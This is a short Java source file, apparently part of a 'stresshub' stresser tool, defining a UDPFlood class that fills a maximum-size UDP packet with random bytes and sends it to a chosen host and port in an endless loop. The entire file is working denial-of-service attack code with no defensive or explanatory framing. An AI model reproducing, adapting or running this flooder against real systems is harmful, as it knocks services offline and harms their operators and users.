package me.c1tad31.eminence.stresshub.methods;

import java.io.IOException;
import java.net.*;
import java.security.SecureRandom;

public class UDPFlood {
    public static void sendFlood(String host, int port) {
        DatagramSocket socket = null;
        InetAddress address = null;
        byte[] buf = new byte[65507];
        SecureRandom random = new SecureRandom();

        String ipAddr = host;
        int portDst = port;

        try {
            socket = new DatagramSocket();
        } catch (SocketException e) {
            e.printStackTrace();
        }

        try {
            address = InetAddress.getByName(ipAddr);
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }

        random.nextBytes(buf);
        DatagramPacket packet = new DatagramPacket(buf, buf.length, address, portDst);

        try {
            System.out.printf("[*] Start flooding %s:%d\n", ipAddr, portDst);
            while (true) {
                socket.send(packet);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        socket.close();
    }
}
